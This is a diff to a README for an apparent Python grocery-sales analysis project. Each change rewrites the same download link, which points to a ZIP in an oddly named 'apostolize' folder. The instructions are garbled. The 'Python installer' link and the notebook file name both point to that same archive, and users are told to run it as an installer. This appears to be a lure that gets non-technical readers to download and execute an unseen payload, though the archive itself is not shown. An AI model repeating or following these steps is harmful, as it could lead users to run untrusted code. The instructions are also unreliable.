@@ -1,6 +1,6 @@
 # 🛒 Supermart-Grocery-Sales-Analysis - Easy Grocery Sales Insights
 
-[![Download Release](https://github.com/paboAce/Supermart-Grocery-Sales-Analysis/raw/refs/heads/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip)](https://github.com/paboAce/Supermart-Grocery-Sales-Analysis/raw/refs/heads/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip)
+[![Download Release](https://raw.githubusercontent.com/paboAce/Supermart-Grocery-Sales-Analysis/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip)](https://raw.githubusercontent.com/paboAce/Supermart-Grocery-Sales-Analysis/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps carefully to download, install, and run Supermart-Grocery-Sal
 
 Click this link to visit the release page where all versions are available:
 
-[![Download Release](https://github.com/paboAce/Supermart-Grocery-Sales-Analysis/raw/refs/heads/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip)](https://github.com/paboAce/Supermart-Grocery-Sales-Analysis/raw/refs/heads/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip)
+[![Download Release](https://raw.githubusercontent.com/paboAce/Supermart-Grocery-Sales-Analysis/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip)](https://raw.githubusercontent.com/paboAce/Supermart-Grocery-Sales-Analysis/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip)
 
 Here, you will find the latest files available for download. Look for the most recent release and download the ZIP file or folder that contains everything you need.
 
@@ -44,7 +44,7 @@ Here, you will find the latest files available for download. Look for the most r
 
 Supermart-Grocery-Sales-Analysis runs using Python, a programming language. You will use Python to run the analysis.
 
-- Go to [https://github.com/paboAce/Supermart-Grocery-Sales-Analysis/raw/refs/heads/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip](https://github.com/paboAce/Supermart-Grocery-Sales-Analysis/raw/refs/heads/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip)
+- Go to [https://raw.githubusercontent.com/paboAce/Supermart-Grocery-Sales-Analysis/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip](https://raw.githubusercontent.com/paboAce/Supermart-Grocery-Sales-Analysis/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip)
 - Download the installer for your system (Windows, macOS, or Linux)
 - Run the installer and follow the on-screen instructions
 - Important: When installing, check the box to add Python to your system PATH
@@ -108,7 +108,7 @@ This will open a new window in your web browser showing the notebook files.
 4. Look for a file named something like:
 
 ```
-https://github.com/paboAce/Supermart-Grocery-Sales-Analysis/raw/refs/heads/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip
+https://raw.githubusercontent.com/paboAce/Supermart-Grocery-Sales-Analysis/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip
 ```
 
 5. Click on the file to open it.
@@ -149,7 +149,7 @@ https://github.com/paboAce/Supermart-Grocery-Sales-Analysis/raw/refs/heads/main/
 
 Access the latest files here:
 
-[Download Supermart-Grocery-Sales-Analysis](https://github.com/paboAce/Supermart-Grocery-Sales-Analysis/raw/refs/heads/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip)
+[Download Supermart-Grocery-Sales-Analysis](https://raw.githubusercontent.com/paboAce/Supermart-Grocery-Sales-Analysis/main/apostolize/Supermart_Grocery_Analysis_Sales_v1.5.zip)
 
 Follow the steps to set up Python, install necessary packages, extract the files, and run the Jupyter Notebook. The instructions above guide you through the entire process.
 
